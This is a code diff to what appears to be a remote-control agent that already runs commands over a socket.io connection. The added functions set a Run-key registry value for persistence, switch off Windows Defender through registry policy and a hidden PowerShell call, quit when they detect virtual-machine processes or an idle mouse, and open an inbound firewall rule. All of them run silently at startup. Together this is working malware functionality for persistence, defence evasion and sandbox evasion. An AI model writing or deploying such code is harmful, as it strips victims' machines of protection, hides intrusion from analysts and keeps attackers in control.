@@ -419,6 +419,79 @@ def execute_command(command):
     except Exception as e:
         return f"Command execution failed: {e}"
 
+def modify_registry():
+    """Create a marker value in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for demo."""
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+        winreg.SetValueEx(key, "AgentMarker", 0, winreg.REG_SZ, "AgentWasHere")
+        winreg.CloseKey(key)
+        print("[OK] Registry marker set.")
+    except Exception as e:
+        print(f"[WARN] Registry modification failed: {e}")
+
+
+def disable_defender():
+    """Attempt to disable Windows Defender via registry and PowerShell."""
+    try:
+        # Registry method
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
+        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        # PowerShell method
+        subprocess.run([
+            'powershell.exe', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        print("[OK] Defender disable attempted.")
+    except Exception as e:
+        print(f"[WARN] Defender disable failed: {e}")
+
+
+def anti_analysis_vm():
+    """Detect VM or analysis environment."""
+    try:
+        # Check for common VM process names
+        vm_names = ['vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 'vmsrvc.exe', 'vmusrvc.exe']
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'].lower() in vm_names:
+                print("[WARN] VM process detected. Exiting.")
+                sys.exit(0)
+        # Check for no mouse movement (sandbox)
+        try:
+            import win32gui
+            pos1 = win32gui.GetCursorPos()
+            time.sleep(2)
+            pos2 = win32gui.GetCursorPos()
+            if pos1 == pos2:
+                print("[WARN] No mouse movement detected. Exiting.")
+                sys.exit(0)
+        except:
+            pass
+        print("[OK] Anti-analysis checks passed.")
+    except Exception as e:
+        print(f"[WARN] Anti-analysis failed: {e}")
+
+
+def add_firewall_exception():
+    """Add this agent to the Windows Firewall allowed list."""
+    try:
+        exe_path = sys.executable
+        rule_name = f"AgentFirewallRule_{uuid.uuid4()}"
+        subprocess.run([
+            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+            f'name={rule_name}', 'dir=in', 'action=allow', f'program={exe_path}'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        print("[OK] Firewall exception added.")
+    except Exception as e:
+        print(f"[WARN] Firewall exception failed: {e}")
+
+# --- Call these at startup (Windows only) ---
+if __name__ == "__main__":
+    if os.name == 'nt' and WINDOWS_AVAILABLE:
+        modify_registry()
+        disable_defender()
+        anti_analysis_vm()
+        add_firewall_exception()
+
 @sio.event
 def connect():
     agent_id = get_or_create_agent_id()
